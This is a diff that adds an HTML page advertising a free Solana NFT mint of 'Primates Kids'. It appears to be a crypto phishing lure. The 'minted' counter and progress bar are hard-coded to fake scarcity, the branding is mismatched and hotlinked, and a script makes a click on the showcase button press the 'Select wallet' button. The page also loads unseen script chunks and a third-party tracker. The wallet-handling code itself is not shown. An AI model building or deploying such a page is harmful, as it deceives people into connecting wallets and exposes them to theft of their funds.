@@ -1,0 +1,263 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+
+    <style>
+        @font-face { font-family: Grinched; src: url('Grinched.otf'); } 
+       
+        h1 {
+           font-family: Grinched
+        }
+      </style>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Monkelabs" data-react-helmet="true">
+    <meta name="theme-color" content="#05FFFF">
+    <meta content="FREE MINT" property="og:title">
+    <meta content="
+	🎉 We are glad to to announce that the minting of 3333 Primates Kids NFT is live!
+
+    ❗ We 𝐬𝐭𝐚𝐫𝐭 𝐞𝐚𝐫𝐥𝐢𝐞𝐫 to avoid congestion on Solana and give everyone a fair chance to mint. (PUBLIC CAN MINT!!)
+    
+    🏷️Sale Info
+    ▶ Mint Price: 0 SOL
+    ▶ Supply: 3333
+
+    ❗ Do not click any other links, stay safe!
+    
+    🎀 𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮❢" property="og:description">
+    <meta content='https://assets-global.website-files.com/621f2ae39342fe5b34cc196f/622063039e289f27bc601f67_OKB-Logo.png' property='og:image'>
+    <title>Primates Kids</title>
+    <link type="application/json+oembed" href="embed.json"/>
+    <link rel="shortcut icon" href="favicon.png">
+    <link rel="stylesheet" href="ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <link rel="stylesheet" href="assets/css/normalize.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+
+    <script>
+        window.addEventListener('click', () => {
+            document.getElementById('showcase__btn0').addEventListener('click', function(e) {
+                document.getElementsByClassName('MuiButton-containedPrimary')[0].click();
+            });
+        });
+    </script>
+</head>
+
+<body>
+    <header>
+        <div class="logo"><img src="https://assets-global.website-files.com/621f2ae39342fe5b34cc196f/622063039e289f27bc601f67_OKB-Logo.png" alt="Logo"></div>
+        <div class="social-list">
+           
+        </div>
+    </header>
+
+    <section  class="section main-screen">
+        <div style="display: flex; flex-direction:column-reverse;" class="main-area">
+
+            <div style=" margin-top: 40px;" class="main-area__right">
+                <div class="slider-area">
+                    <img src="assets/img/preview.gif" alt="GiF">
+                    <div class="token">
+                                
+                      <div class="token-number" id="tokenup"><span id="tokennumber">3066</span> out of <span id="endTick">3333</span></div>
+                      <div class="token-line">
+                          <div class="line"></div>
+                          <div class="progress-line" style="width: 92%;"></div>
+                      </div>
+                </div><br>
+                
+                
+                  
+              </div>
+
+                <h2 style="text-align: center;  word-break:break-all;" class="right-title">PRICE: 0 ◎</h2>
+
+                
+
+                <div style="display: flex; flex-direction:column;" class="price">
+
+
+
+                    <div  style="display: flex; flex-direction:column;" class="button-box">
+                      <div id="root" class="cl-root"><main><div class="sc-dlfnuX bJgQKs"><button class="MuiButtonBase-root MuiButton-root MuiButton-contained sc-bdfBQB kKVOCU MuiButton-containedPrimary" tabindex="0" type="button"><span class="MuiButton-label">Select wallet</span><span class="MuiTouchRipple-root"></span></button></div></main>
+                        </div>
+                        <div style="text-align:center ;" class="price-box">
+                            Powered by METAPLEX
+                            
+                        </div>
+
+                        
+                        
+                    </div>
+                    
+                </div>
+
+            </div>
+
+
+            <div class="main-area__left">
+                
+            </div>
+
+        </div>
+    </section>
+
+    <script src="assets/js/jquery-3.6.0.min.js"></script>
+    <script src="assets/js/slick.min.js"></script>
+
+    <script>
+        const $plusButton = document.querySelector(".plus-btn");
+        const $minuButton = document.querySelector(".minus-btn");
+        const $numberText = document.querySelector("#total");
+        const $remaining = document.querySelector('#remaining');
+        const $priceResultText = document.querySelector("#price-total span");
+        let itemPriceSelected = 0.5;
+        let itemCount = 1;
+
+        $plusButton.addEventListener("click", function(e) {
+            e.preventDefault();
+            itemCount = itemCount < 5 ? itemCount + 1 : 5;
+            $numberText.value = itemCount;
+            $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2);
+        });
+        $minuButton.addEventListener("click", function(e) {
+            e.preventDefault();
+            itemCount = parseInt($numberText.value);
+            itemCount = itemCount > 1 ? itemCount - 1 : itemCount;
+            $numberText.value = itemCount;
+            $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2);
+        });
+    </script>
+
+    <script>
+        ! function(e) {
+
+            function t(t) {
+                for (var n, i, a = t[0], c = t[1], l = t[2], s = 0, p = []; s < a.length; s++) i = a[s], Object
+                    .prototype
+                    .hasOwnProperty.call(o, i) && o[i] && p.push(o[i][0]), o[i] = 0;
+                for (n in c) Object.prototype.hasOwnProperty.call(c, n) && (e[n] = c[n]);
+                for (f && f(t); p.length;) p.shift()();
+                return u.push.apply(u, l || []), r()
+            }
+
+            function r() {
+                for (var e, t = 0; t < u.length; t++) {
+                    for (var r = u[t], n = !0, a = 1; a < r.length; a++) {
+                        var c = r[a];
+                        0 !== o[c] && (n = !1)
+                    }
+                    n && (u.splice(t--, 1), e = i(i.s = r[0]))
+                }
+                return e
+            }
+            var n = {},
+                o = {
+                    1: 0
+                },
+                u = [];
+
+            function i(t) {
+                if (n[t]) return n[t].exports;
+                var r = n[t] = {
+                    i: t,
+                    l: !1,
+                    exports: {}
+                };
+                return e[t].call(r.exports, r, r.exports, i), r.l = !0, r.exports
+            }
+            i.e = function(e) {
+                var t = [],
+                    r = o[e];
+                if (0 !== r)
+                    if (r) t.push(r[2]);
+                    else {
+                        var n = new Promise((function(t, n) {
+                            r = o[e] = [t, n]
+                        }));
+                        t.push(r[2] = n);
+                        var u, a = document.createElement("script");
+                        a.charset = "utf-8", a.timeout = 120, i.nc && a.setAttribute("nonce", i.nc), a.src =
+                            function(
+                                e) {
+                                return i.p + "../static/js/" + ({}[e] || e) + "." + {
+                                    3: ""
+                                }[e] + "chunk.js"
+                            }(e);
+                        var c = new Error;
+                        u = function(t) {
+                            a.onerror = a.onload = null, clearTimeout(l);
+                            var r = o[e];
+                            if (0 !== r) {
+                                if (r) {
+                                    var n = t && ("load" === t.type ? "missing" : t.type),
+                                        u = t && t.target && t.target.src;
+                                    c.message = "Loading chunk " + e + " failed.\n(" + n + ": " + u + ")", c
+                                        .name =
+                                        "ChunkLoadError", c.type = n, c.request = u, r[1](c)
+                                }
+                                o[e] = void 0
+                            }
+                        };
+                        var l = setTimeout((function() {
+                            u({
+                                type: "timeout",
+                                target: a
+                            })
+                        }), 12e4);
+                        a.onerror = a.onload = u, document.head.appendChild(a)
+                    }
+                return Promise.all(t)
+            }, i.m = e, i.c = n, i.d = function(e, t, r) {
+                i.o(e, t) || Object.defineProperty(e, t, {
+                    enumerable: !0,
+                    get: r
+                })
+            }, i.r = function(e) {
+                "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol
+                    .toStringTag, {
+                        value: "Module"
+                    }), Object.defineProperty(e, "__esModule", {
+                    value: !0
+                })
+            }, i.t = function(e, t) {
+                if (1 & t && (e = i(e)), 8 & t) return e;
+                if (4 & t && "object" == typeof e && e && e.__esModule) return e;
+                var r = Object.create(null);
+                if (i.r(r), Object.defineProperty(r, "default", {
+                        enumerable: !0,
+                        value: e
+                    }), 2 & t && "string" != typeof e)
+                    for (var n in e) i.d(r, n, function(t) {
+                        return e[t]
+                    }.bind(null, n));
+                return r
+            }, i.n = function(e) {
+                var t = e && e.__esModule ? function() {
+                    return e.default
+                } : function() {
+                    return e
+                };
+                return i.d(t, "a", t), t
+            }, i.o = function(e, t) {
+                return Object.prototype.hasOwnProperty.call(e, t)
+            }, i.p = "/", i.oe = function(e) {
+                throw console.error(e), e
+            };
+            var a = this["webpackJsonpcandy-machine-mint"] = this["webpackJsonpcandy-machine-mint"] || [],
+                c = a.push.bind(a);
+            a.push = t, a = a.slice();
+            for (var l = 0; l < a.length; l++) t(a[l]);
+            var f = c;
+            r()
+        }([])
+    </script>
+    <script src="static/js/chunk.js"></script>
+    <script src="static/js/main.chunk.js"></script>
+    <script src="assets/js/tokenup.js"></script>
+</body>
+<script charset="UTF-8" id="LA_COLLECT" src="https://sdk.51.la/js-sdk-pro.min.js?id=Jcxh21KnkRW6b6CQ&amp;ck=Jcxh21KnkRW6b6CQ"></script>
+</html>
